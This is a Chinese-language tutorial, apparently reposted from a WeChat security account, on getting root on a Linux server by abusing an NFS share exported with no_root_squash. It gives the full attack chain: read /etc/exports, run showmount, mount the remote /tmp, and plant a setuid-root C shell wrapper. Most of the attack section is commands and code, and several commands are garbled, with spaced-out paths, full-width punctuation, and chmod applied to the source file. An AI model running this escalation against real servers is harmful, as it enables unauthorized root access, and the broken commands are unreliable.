\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/ij57dC8opaT2xJHYTBxBHw)

如果在服务器上具有低特权 shell，并且发现服务器中具有 NFS 共享，则可以使用它来升级特权。但是成功取决于它的配置方式。  

**目录**

```
1.什么是NFS？
2.什么是root\_sqaush和no\_root\_sqaush？
3.所需的工具和程序文件。
4.利用NFS弱权限。

```

**什么是 NFS？**

网络文件系统（NFS）是一个客户端 / 服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在  NFS  协议是几个分布式文件系统标准，网络附加存储（NAS）之一。

NFS 是基于 UDP/IP 协议的应用，其实现主要是采用远程过程调用 RPC 机制，RPC 提供了一组与机器、操作系统以及低层传送协议无关的存取远程文件的操作。RPC 采用了 XDR 的支持。XDR 是一种与机器无关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支持在异构系统之间数据的传送。  

**什么是 root\_sqaush 和 no\_root\_sqaush？**

Root Squashing（root\_sqaush）参数阻止对连接到 NFS 卷的远程 root 用户具有 root 访问权限。远程根用户在连接时会分配一个用户 “ nfsnobody ”，它具有最少的本地特权。如果 no\_root\_squash 选项开启的话”，并为远程用户授予 root 用户对所连接系统的访问权限。在配置 NFS 驱动器时，系统管理员应始终使用 “ root\_squash ” 参数。

注意：要利用此，no\_root\_squash 选项得开启。

**利用 NFS 并获取 Root Shell**

现在，我们拿到了一个低权限的 shell，我们查看 “ / etc / exports ” 文件。

/ etc / exports 文件包含将哪些文件夹 / 文件系统导出到远程用户的配置和权限。

这个文件的内容非常简单，每一行由抛出路径，客户名列表以及每个客户名后紧跟的访问选项构成：

\[共享的目录\] \[主机名或 IP(参数, 参数)\]

```
其中参数是可选的，当不指定参数时，nfs将使用默认选项。默认的共享选项是 sync,ro,root\_squash,no\_delay。
当主机名或IP地址为空时，则代表共享给任意客户机提供服务。
当将同一目录共享给多个客户机，但对每个客户机提供的权限不同时，可以这样：
\[共享的目录\] \[主机名1或IP1(参数1,参数2)\] \[主机名2或IP2(参数3,参数4)\]

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBG8BzNlVq8DbdZEtWUdclnBK87lUvEvKJyaorDVVGe3eficgM4KCVnL9iaamTUQh5LJ45oJd5Oc0bw/640?wx_fmt=png)

我们可以看到 / tmp 文件夹是可共享的，远程用户可以挂载它。

还有不安全的参数 “ rw ”（读，写），“ sync ” 和 “ no\_root\_squash ”

同样我们也可以使用 showmount 命令来查看。

```
showmount命令用于查询NFS服务器的相关信息
# showmount --help
 Usage: showmount \[-adehv\]
        \[--all\] \[--directories\] \[--exports\]
        \[--no-headers\] \[--help\] \[--version\] \[host\]
-a或--all
    以 host:dir 这样的格式来显示客户主机名和挂载点目录。
 -d或--directories
    仅显示被客户挂载的目录名。
 -e或--exports
    显示NFS服务器的输出清单。
 -h或--help
    显示帮助信息。
 -v或--version
    显示版本信。
 --no-headers
    禁止输出描述头部信息。
显示NFS客户端信息
 # showmount
显示指定NFS服务器连接NFS客户端的信息
 # showmount 192.168.1.1  #此ip为nfs服务器的
显示输出目录列表
 # showmount -e
显示指定NFS服务器输出目录列表（也称为共享目录列表）
 # showmount -e 192.168.1.1
显示被挂载的共享目录
 # showmount -d
显示客户端信息和共享目录
 # showmount -a
显示指定NFS服务器的客户端信息和共享目录
# showmount -a 192.168.1.1

```

这里不多说了

我们接下来在我们的攻击机上安装客户端工具

需要执行以下命令，安装 nfs-common 软件包。apt 会自动安装 nfs-common、rpcbind 等 12 个软件包

```
sudo apt install nfs-common
apt-get install cifs-utils

```

**然后输入命令**

```
showmount -e \[IP地址\]

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBG8BzNlVq8DbdZEtWUdclnqtblialQzJUJRv6ibARcJDuNmAbeic870bUf3UdGUyZmQbhKGR6k5tqCw/640?wx_fmt=png)  

创建目录以挂载远程系统。

```
mkdir / tmp / test

```

**在 / tmp/test 上装载 Remote/tmp 文件夹：**

```
mount -o rw，vers = 2 \[IP地址\]：/ tmp / tmp / test

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBG8BzNlVq8DbdZEtWUdclnh1eJpGQeObM8YLHl2ujHOL4ZrIWWbLDT1DGtdf4EBrkhCGEpBTwHbg/640?wx_fmt=png)  

**然后在 / tmp/test / 中。新建一个 c 文件。**

```
#include <stdio.h> 
#include <stdlib.h> 
#include <sys/types.h> 
#include <unistd.h> 
int main() { setuid(0); system("/bin/bash"); return 0; }

```

**也可以**

```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/test/suid-shell.c

```

编译：

```
gcc /tmp/test/suid-shell.c -o / tmp / 1 / suid-shel

```

赋权：

```
chmod + s /tmp/test/suid-shell.c

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBG8BzNlVq8DbdZEtWUdcln0LllMKPCCC66emWn9aK9tQU3dU4wSmA9e3NaPOibluR2GP5SicvNPe6A/640?wx_fmt=png)  

**好的，我们回到要提权的服务器上**

```
cd / tmp
./suid-shell

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBG8BzNlVq8DbdZEtWUdcln16AcnMyeRpXib4nGibdXNJ9ZfVs2z5kSftHsfLicWQuRKibiabh3bdvTIGw/640?wx_fmt=png)

可以看到是 ROOT 权限了

系列  

[**Linux 提权姿势一：滥用 SUDO 提权**](http://mp.weixin.qq.com/s?__biz=MzU4NTY4MDEzMw==&mid=2247485792&idx=1&sn=f95b077a3ba53e5c6d6459e45324401d&chksm=fd879d0acaf0141ce11ac3c966cdc83614ed1d6b26e37945d9c459f13c5342ccdbd1740cd7de&scene=21#wechat_redirect)

渗透测试 红队攻防 免杀 权限维持 等等技术 

及时分享最新漏洞复现以及 EXP 国内外最新技术分享!!!

进来一起学习吧

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDC1QHAC8PAV6JaPBJno5cRxvqAVB1pm0tOZd3TQM7jCB5nTbnfa40GHHQFIWpFFRuHCCCdtykVQWQ/640?wx_fmt=jpeg)